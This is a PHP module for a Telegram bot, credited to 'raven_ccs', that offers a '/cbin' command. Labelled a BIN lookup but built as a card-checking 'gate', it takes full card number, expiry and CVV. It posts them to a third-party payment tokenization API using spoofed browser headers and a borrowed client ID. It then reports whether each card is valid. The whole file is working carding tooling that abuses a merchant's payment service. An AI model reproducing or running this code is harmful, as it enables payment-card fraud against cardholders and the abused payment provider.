<?php
#----------------------------------------------------------------------#
#   CODED BY: Avin-Knight                                              #
#   GATE: Bin Lookup 2                                                 #
#   CONF: SECUREPAY API              				                   #
#----------------------------------------------------------------------#

////==============[Bin Lookup Command]==============////

if ((strpos($message, "/cbin") === 0) || (strpos($message, "!cbin") === 0)){
$lista = substr($message, 5);
$lista = ltrim($lista);

if (empty($lista) || (strlen($lista) < 24) ) {
  $respo = urlencode ("<b>Invalid or Empty Input </b>❌\n<b>Format:</b> <code>/cbin cc|m|y|cvv</code>");
  sendMessage($chatId, $respo , $message_id); 
  return;  
}
 

error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');

if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }


//================ [ INCLUDE FUNCTIONS ] ===============//
//include "./Tools/functions/usefun.php";
//include "./Tools/functions/flagsgen.php";


//================= [ EXPLODE & LISTA ] ================//
$lista = substr($message, 5);  
//$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);

if (empty($lista) || (strlen($lista) < 24) ) {
    $respo = urlencode ("<b>Invalid or Empty Input </b>❌\n<b>Format:</b> <code>/cbin cc|m|y|cvv</code>");
    sendMessage($chatId, $respo , $message_id); 
    return;  
}

//================ [ Anti-Spam ] ===============//
if (($userId == "6515961910") === false){
list($spam, $timeleft) = checkAntispam($userId, 5);
if ($spam) {
    $respo = urlencode ("<b>ANTI SPAM </b>❌\n<a>Try after $timeleft seconds</a>\n");
    sendMessage($chatId, $respo , $message_id);
    exit(); }
}
  
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1; }

if (strlen($ano) == 4) $ano = substr($ano, 2, 2);
if (strlen($mes) == 1) $mes = "0$mes";

$lista = "$cc|$mes|$ano|$cvv";
$first6 = substr("$lista", 0, 6);



sendaction($chatId, "typing");
$text = urlencode ("<b>BIN LookUP : </b> Checking.. ♻️ <b>\n
Bin      :</b>   <code>$first6 </code><b>
Result :</b>  <i>Please wait for a second. ⏳</i>");
$msg_result = reply($chatId, $text , $message_id);
$msg_json = json_decode($msg_result, TRUE);
$msg_id = $msg_json['result']['message_id']; 
  
//================= [ CURL REQUESTS ] =================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://securepay.svcs.endurance.com/v1/payments/token');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: securepay.svcs.endurance.com',
'accept: */*',
'accept-language: en-GB,en;q=0.9',
'content-type: application/json',
'origin: https://securepay.svcs.endurance.com',
'referer: https://securepay.svcs.endurance.com/payment/cc.html?clientId=400001',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientId":"400001","method":"CREDITCARD","type":"MULTI","creditCard":{"cardNumber":"'.$cc.'","cardSecureCode":"'.$cvv.'","cardExpiration":"'.$mes.''.$ano.'"}}');
$res1 = curl_exec($ch);
curl_close($ch);
$code = trim(strip_tags(getStr($res1,'"code":"','"')));
$err = trim(strip_tags(getStr($res1,'"key":"','"')));
$msg = trim(strip_tags(getStr($res1,'"message":"','"')));

$fim = json_decode($res1,true);
$bin2 = $fim['binData']['number'];
$brand = $fim['binData']['brand'];
$type = $fim['binData']['type'];
$level = $fim['binData']['level'];
$bank = $fim['binData']['bank'];
$country = $fim['binData']['country'];
$cuntry = $fim['binData']['countryCode'];
$flag = getFlags(''.$cuntry.'');

$bininfo = "$bin2 - $brand - $type - $level - $bank - $country - $flag";
//echo "<br><b>BIN DATA:</b> $bininfo<br>";



if((strpos($res1, '"number":')) || (strpos($res1, '"clientId":"400001"'))){
$respo = urlencode ("<b>BIN LookUP : </b> VALID ✅ <b>\n
✦ Bin     :</b>  <code>$bin2 </code><b>
✦ Brand:</b>  <i>$brand </i><b>
✦ Type  :</b>  <i>$type </i><b>
✦ Level :</b>  <i>$level </i><b>
✦ Bank :</b>  <i>$bank </i><b>
✦ Type  :</b>  <i>$country ($flag) </i>\n
  ═══════════════════ \n<b>Bot Made by:</b><a> [raven_ccs]</a>");
  editMessage($chatId, $respo , $msg_id);
  return;  
}  

elseif((strpos($res1, '"code":')) || (strpos($res1, '"message":'))){
$respo = urlencode ("<b>BIN LookUP : </b> INVALID ❌ <b>\n
✦ Bin   :</b>   <code>$first6 </code><b>
✦ MSG :</b>  <i>$msg </i>\n
═══════════════════ \n<b>Bot Made by:</b><a> [raven_ccs]</a>");
  editMessage($chatId, $respo , $msg_id);
  return;  
}  

else  {
$respo = urlencode ("<b>BIN LookUP : </b> ERROR ❌ <b>\n
✦ Bin     :</b>  <code>$first6 </code><b>
✦ Error  :</b>  <i>$err [$code]</i><b>
✦ Message:</b>  <i>$msg </i>\n
═══════════════════ \n<b>Bot Made by:</b><a> [raven_ccs]</a>");
  editMessage($chatId, $respo , $msg_id);
  return;  
} 

  
}

////=============[Bin Command-END]==============////

?>